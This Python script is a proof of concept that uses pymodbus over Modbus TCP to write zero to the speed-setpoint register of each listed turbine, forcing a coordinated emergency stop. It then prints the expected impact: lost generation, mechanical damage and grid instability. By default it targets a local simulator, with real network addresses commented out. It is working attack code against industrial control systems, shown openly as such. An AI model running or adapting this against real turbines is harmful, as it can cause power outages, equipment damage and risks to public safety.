#!/usr/bin/env python3
"""
Proof of Concept: Mass Turbine Emergency Stop Attack
Demonstrates disruption capability - DESTRUCTIVE DEMO
WARNING: This modifies control systems
"""

import time

from pymodbus.client import ModbusTcpClient


def emergency_stop_attack(turbine_ips):
    """
    Write 0 to all turbine speed setpoints
    Simulates coordinated shutdown attack
    """
    print("=" * 70)
    print("[!] WARNING: DESTRUCTIVE OPERATION")
    print("[!] This will modify turbine setpoints")
    print("=" * 70 + "\n")

    results = []

    for turbine_ip in turbine_ips:
        print(f"[*] Targeting turbine at {turbine_ip}...")

        client = ModbusTcpClient(turbine_ip, port=10502)

        client.slave_id = 1
        if not client.connect():
            print("    [!] Connection failed")
            results.append(
                {"ip": turbine_ip, "success": False, "error": "Connection failed"}
            )
            continue

        try:
            # Read current setpoint
            current = client.read_holding_registers(address=0, count=1)  # type: ignore
            if not current.isError():
                print(f"    Current setpoint: {current.registers[0]} RPM")

            # ATTACK: Write 0 to speed setpoint (emergency stop)
            # Note: pymodbus 3.x removed 'slave' parameter
            result = client.write_register(address=0, value=0)

            if result.isError():
                print("    [!] Write failed")
                results.append(
                    {"ip": turbine_ip, "success": False, "error": "Write failed"}
                )
            else:
                print("    [✓] Emergency stop executed")

                # Verify write
                time.sleep(0.5)
                verify = client.read_holding_registers(address=0, count=1)  # type: ignore
                if not verify.isError():
                    print(f"    New setpoint: {verify.registers[0]} RPM")

                results.append({"ip": turbine_ip, "success": True, "new_value": 0})

        except Exception as e:
            print(f"    [!] Error: {e}")
            results.append({"ip": turbine_ip, "success": False, "error": str(e)})

        finally:
            client.close()

        print()

    # Summary
    print("=" * 70)
    print("[*] ATTACK SUMMARY")
    print("=" * 70)

    successful = sum(1 for r in results if r["success"])
    total = len(results)

    print(f"Turbines targeted: {total}")
    print(f"Successful attacks: {successful}")
    print(f"Failed attacks: {total - successful}")

    print("\n[*] IMPACT:")
    if successful > 0:
        print(f"    • {successful} turbine(s) forced to emergency stop")
        print("    • Immediate loss of power generation")
        print("    • Potential mechanical damage from rapid deceleration")
        print("    • Grid stability impact")
        print("    • Manual restart required")

    print("\n[*] DETECTION:")
    print("    • SCADA alarms would trigger immediately")
    print("    • Sudden loss of generation visible")
    print("    • However, attack takes only seconds")
    print("    • Damage may already be done before response")

    return results


if __name__ == "__main__":
    # Target list
    turbines = [
        "127.0.0.1",  # For local demo with simulator
        # '192.168.10.10',  # Uncomment for real network demo
        # '192.168.10.11',
        # '192.168.10.12'
    ]

    print("[!] This is a DESTRUCTIVE demonstration")
    print("[!] Only run against test systems you own\n")

    # Uncomment to execute
    emergency_stop_attack(turbines)
